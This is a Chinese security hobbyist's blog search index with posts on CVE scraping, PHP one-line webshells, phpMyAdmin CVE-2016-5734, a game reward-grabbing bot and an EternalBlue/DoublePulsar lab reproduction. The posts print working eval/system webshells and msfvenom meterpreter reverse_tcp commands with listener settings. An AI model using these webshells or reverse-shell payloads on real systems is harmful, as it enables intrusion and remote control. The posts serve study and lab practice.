<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python实现爬行漏洞影响范围]]></title>
    <url>%2F2018%2F08%2F03%2FPython%E5%AE%9E%E7%8E%B0%E7%88%AC%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4%2F</url>
    <content type="text"><![CDATA[​ 因为工作上有这个需求，想着顺便练练Python，一开始真的是被Python 2.7给坑惨了。也不知道是因为官方不在提供2.7的支持还是其他问题，一开始配置包括安装pip，pip升级，pip安装模块各种问题，差点炸毛了。后改用Python 3世界终于变得清净了。 ​ 具体功能很简单，就是爬去漏洞平台指定CVE的影响范围，思路是先通过xpath提取内容所在的标签，然后再对提取的内容进行正则匹配，最后输出到txt文件中。具体代码如下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from lxml import etreeimport urllib.requestimport osimport redef main(uri): data = urllib.request.urlopen(uri) x = data.read() x = (x.decode("utf-8")) html = etree.HTML(x) items = html.xpath("//div[@class=\"summary\"]/p/text()") "//div[contains(@id,\"info_\")]" #judge if the items[]'s value is null. if true, pass. if items: re_ret = re_place1(items[0]) if re_ret: pass else: re_ret = re_place2(items[0]) if re_ret: pass else: re_ret='Others' else: re_ret='NULL' return (re_ret)def re_place1(item): r_rule = r'\)\. (S[^\u4e00-\u9fa5]+)\. [E|D]' re_result = re.findall(r_rule,item) if re_result: return re_result[0] def re_place2(item): r_rule = r'([^\u4e00-\u9fa5]+) allows' re_result = re.findall(r_rule,item) if re_result: return re_result[0]if __name__ == '__main__': #uri #http://cve.scap.org.cn/CVE-2018-2771.html f = open('D:\\Users\\sangfor\\Desktop\\mysql.txt',mode='r') dic_cve = f.read().split('\n') #print(dic_cve) #creat file to write wr_file = open('results.txt',mode='w') for each in dic_cve: #print(each) url = 'http://cve.scap.org.cn/' + each + '.html' get_ret = main(url) wr_file.writelines(each+','+get_ret+'\n') wr_file.close()]]></content>
      <categories>
        <category>编程日常</category>
      </categories>
      <tags>
        <tag>Python,XPath</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自写菜刀之路——PHP一句话木马的实现原理与利用方法]]></title>
    <url>%2F2018%2F07%2F18%2F%E8%87%AA%E5%86%99%E8%8F%9C%E5%88%80%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[最近为了紧跟大佬室友的学习步伐，提高自身的开发能力，为日后坚持社会主义核心价值观提供知识技能支持，本菜皮皮踏上了自写菜刀的征程。这是大佬室友给的第一个学习建议，不敢懈怠，以前是没大佬指点，现在有了，我也想体会一下当大佬的感觉。 同时，在学习之余做下日常学习记录。都是基础知识，但基础很重要。 PHP一句话PHP一句话可分为eval和system两类。 12&lt;?php @eval($_GET["code"])?&gt;&lt;?php @system($_POST["cmd"])?&gt; 那么用eval和system有什么区别呢？在这里大概说一说，应为对这类脚本语言都不熟悉，就只能说说自己了解的。 eval()是把其中的参数按照PHP代码来解析，因此eval()函数后跟的都必须是合法的PHP代码，切必须以分号结尾。 使用eval()函数的一句话实现菜刀的功能： code参数后边直接跟PHP代码就可以执行了，记得以分号结尾。 1shell1.php?code=phpinfo(); 再说system()函数，PHP中system()函数的参数是直接跟具体命令而不是PHP代码。举个例子： 1&lt;?php @system($_GET["code"])?&gt; 对于这样的一句话，通过GET方法提交参数后的效果如下图： 可以看到，code参数直接赋值具体命令就可以完成命令执行了。总结一下就是eval()函数是代码执行，system()函数是命令执行。 当然现在直接使用这两个函数的一句话基本看不到了，毕竟特征太明显了，大部分情况下都会被拦截。但高深的一句话用法以后再讨论了，当下还是要先写菜刀。。。。 参考文章链接]]></content>
      <categories>
        <category>学习日常</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PhpMyadmin命令执行漏洞（CVE-2016-5734）]]></title>
    <url>%2F2018%2F07%2F18%2FPhpMyadmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-5734%EF%BC%89%2F</url>
    <content type="text"><![CDATA[漏洞介绍CVE-2016-5734是PhpMyadmin命令执行漏洞。 影响范围： PHP版本4.3.0-5.4.6中能触发，PHP 5.4.7后就不能触发。 PhpMyAdmin 4.3.0 - 4.6.2存在该漏洞，PhpMyadmin在4.6.3版本中修复了该漏洞。 漏洞成因分析这个漏洞主要是由PHP语言中preg_replace()函数造成得。我们先看介绍一下这个函数。 preg_replace（）函数得作用是执行一个正则表达式得搜索和替换。其具体参数如下： 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) $pattern参数代表要搜索的模式，可以是一个字符串或者字符串数组； $replacement参数表示用于替换的字符串或字符串数组； $subject参数表示要搜索替换的目标字符串或字符串数组； $limit参数可选，表示对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）； $count参数可选，代表要替换执行的次数。 当subject为一个数组时，preg_replace()返回一个数组，其他情况返回一个字符串。如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。 要触发preg_replace()漏洞有两个前提。第一个参数需要e标识符，有了它可以执行第二个参数的命令；第一个参数需要在第三个参数中的中有匹配，不然会返回第三个参数而不执行命令 。 例如： 12345echo preg_replace('/test/e', 'phpinfo()', 'just test');//这样是可以执行命令的echo preg_replace('/test/e', 'phpinfo()', 'just tesxt');echo preg_replace('/tesxt/e', 'phpinfo()', 'just test');//这两种没有匹配上，所以返回值是第三个参数，不能执行命令 接下来我们再正式来分析CVE-2016-5734的产生原理。 漏洞的产生点在TableSearch.class.php中的_getRegexReplaceRows函数中。以下是这个函数的代码。 123456789101112131415161718192021222324252627282930function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet) &#123; $column = $this-&gt;_columnNames[$columnIndex]; $sql_query = "SELECT " . PMA_Util::backquote($column) . "," . " 1," // to add an extra column that will have replaced value . " COUNT(*)" . " FROM " . PMA_Util::backquote($this-&gt;_db) . "." . PMA_Util::backquote($this-&gt;_table) . " WHERE " . PMA_Util::backquote($column) . " RLIKE '" . PMA_Util::sqlAddSlashes($find) . "' COLLATE " . $charSet . "_bin"; // here we // change the collation of the 2nd operand to a case sensitive // binary collation to make sure that the comparison is case sensitive $sql_query .= " GROUP BY " . PMA_Util::backquote($column) . " ORDER BY " . PMA_Util::backquote($column) . " ASC"; $result = $GLOBALS['dbi']-&gt;fetchResult($sql_query, 0); if (is_array($result)) &#123; foreach ($result as $index=&gt;$row) &#123; $result[$index][1] = preg_replace( "/" . $find . "/", $replaceWith, $row[0] ); &#125; &#125; return $result; &#125; 在上面的函数中使用了preg_replace()函数，并且传入了两个参数$find和$replaceWith。我们来看看这两个参数是从哪里传进来的。首先定位哪里使用了_getRegexReplaceRows()函数，发现在getReplacePreview ()函数中使用了。下面是getReplacePreview ()函数的部分代码。 123456789function getReplacePreview($columnIndex, $find, $replaceWith, $useRegex, $charSet) &#123; $column = $this-&gt;_columnNames[$columnIndex]; if ($useRegex) &#123; $result = $this-&gt;_getRegexReplaceRows( $columnIndex, $find, $replaceWith, $charSet ); &#125; else &#123; 查看代码发$find和$replaceWihth变量也是从其他地方传过来的，继续往前定位，看哪里调用了getReplacePreview ()函数。然后就到了tbl_find_replace.php文件内： 1234567891011121314151617181920require_once 'libraries/common.inc.php';require_once 'libraries/TableSearch.class.php';$response = PMA_Response::getInstance();$table_search = new PMA_TableSearch($db, $table, "replace");$connectionCharSet = $GLOBALS['dbi']-&gt;fetchValue( "SHOW VARIABLES LIKE 'character_set_connection'", 0, 1);if (isset($_POST['find'])) &#123; $preview = $table_search-&gt;getReplacePreview( $_POST['columnIndex'], $_POST['find'], $_POST['replaceWith'], $_POST['useRegex'], $connectionCharSet ); $response-&gt;addJSON('preview', $preview); exit;&#125; 可以看到这里用到了getReplacePreview()函数，并且函数参数都是post方法传递进去的，进而产生了漏洞。但是要利用这个漏洞，首先得有数据库查询权限，因此这个漏洞需要在认证了token的情况下才能利用。但是要利用还需要控制传入的三个参数，后两个参数可空，前三个参数为必填项。这三个参数中，前两个是直接post方法传进去的，但第三个不可控，第三个参数代表了要搜索替换的原字符串。因为无法预测第三个参数的值，所以我们需要提前插入一个已知值。也就是先往数据库里插入一个表。这样命令执行漏洞就可以被完整触发了。 流量分析通过对数据包的捕获，我们可以发现，整个exp执行的过程包括认证、建表、发送paload三个步骤。 认证过程和正常的管理员登陆过程一致，这里就不再赘述了。下面为建表的数据包部分截图。 执行exp过程中，若使用者没有添加数据库参数，则脚本自动选择test数据库进行建表，若用户没用指定表名，脚本自动创建prgpwn表，并在该表中添加first列，值为“320F6500”,即“e/0截断”。从这里可以考虑对数据库的操作进行过滤，大部分攻击者攻击过程都会利用到test库，而管理员对test库的使用频率并不高。但是这样可能存在误报，因为不能肯定管理员不对test库进行操作。 下图为发送payload过程的数据流量。 这里可以清晰的看到，Payload里使用了system函数，这类危险函数可以直接拦截，并且误报几率很低。 以上为此次对CVE-2016-5734的全部分析报告。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[易语言实现天刀兑换活动Q币]]></title>
    <url>%2F2018%2F07%2F05%2F%E6%98%93%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%A4%A9%E5%88%80%E5%85%91%E6%8D%A2%E6%B4%BB%E5%8A%A8Q%E5%B8%81%2F</url>
    <content type="text"><![CDATA[最近天刀新职业版本出了个活动可以使用活动Q兑换真实Q币，想想还是不错的。但是每天都抢不着是真的难受，为了应对脚本猖獗的游戏环境，我决定写个脚本来加入他们-0- 一个功能很单一的程序，软件支持自己设置提交次数，模拟浏览器登录。其他好像没什么了，简单测试了一下基本没啥大问题，但是应该还有些小bug，后边发现了再改吧。附上源代码。 点击下载]]></content>
      <categories>
        <category>编程日常</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu DOS界面使用中文输入法]]></title>
    <url>%2F2018%2F07%2F04%2FUbuntu%20DOS%E7%95%8C%E9%9D%A2%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%2F</url>
    <content type="text"><![CDATA[在ubuntu非图形界面下输入中文的方法： 1、安装一个输入法，以搜狗输入法为例。在终端下操作： 1sudo apt-get install fcitx im-switch fbterm fcitx-frontend-fbterm 2、以前的版本在安装完成后需要配置用户目录下的.fbtermrc文件，现在不需要了。安装完成后直接通过ctrl+space即可切换成中文输入法。如果切换无效，可以输入fcitx回车，完成后就可以通过ctrl+space切换中文输入了。]]></content>
      <categories>
        <category>玩转Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[方程式SMB漏洞复现]]></title>
    <url>%2F2018%2F07%2F04%2F%E6%96%B9%E7%A8%8B%E5%BC%8FSMB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[利用条件，目标系统window10以下，开启了文件共享。实验环境如下： 1、 攻击机，windows10，64位，IP地址 192.168.46.1 2、 监听机，ubuntu，64位，IP地址 192.168.46.139 3、 靶机，win7sp3，32位，IP 192.168.46.129 在复现之前首先要对fb.py文件进行一些修改，将27，28，29，72行代码注释掉。 首先在攻击机上运行fb.py脚本。 Target IP输入靶机IP，Callback IP 输入攻击机得IP，Use Redirection选择no。 之后选择新创建项目，自己输入项目名，下一个直接默认回车。 选择Eternalblue模块，之后一路默认回车直到让选择目标系统和位数时自己根据情况选择，然后继续默认回车。 输入 use Doublepulsar 使用 Doublepulsar插件，之后一路回车到选择项。 选择SMB后门，位数根据靶机自己选择，操作选择rundll。 到这里面我们可以暂时不管攻击机了，转向监听机。首先用ubuntu生成一个恶意得dll文件。具体命令为： 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.46.139 LPORT=5555 -f dll &gt; /home/ryweer/1.dll IP是监听机得IP，端口自己设置。生成之后将1.dll文件导出到攻击机处。在打开msf加载exploit/multi/handler。 设置监听ip位监听机ip，监听端口为dll设置得端口，指令为： 123set lhost 192.168.46.139set lport 5555exploit 监听机已经开始监听，这是我们再返回攻击机，设置dll路径为之前导出得dll路径，之后一路回车。 执行插件是却发现失败了。 这个问题在我复现过程中困扰了很久。DLL Architecture is: 64 bit ，看报错似乎是dll是64位的问题，仔细想靶机为32位，那就是我们在生成dll过程中出现了问题，返回查看发现应该在生成dll时吧x64去掉，换成如下命令再次重复一次。 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.46.139 LPORT=2222 -f dll &gt; /home/ryweer/2.dll 监听机已成功检测到一个shell，复现成功。但是靶机已经检测到，自动重启了系统。估计是系统版本太高，后又在xp系统上测试成功。看来win10以下通杀也只是理论上的。 这里需要注意的是如果靶机位64位系统的话，在使用msf时要加一句 1set PAYLOAD windows/x64/meterpreter/reverse_tcp 32位的系统不用。]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
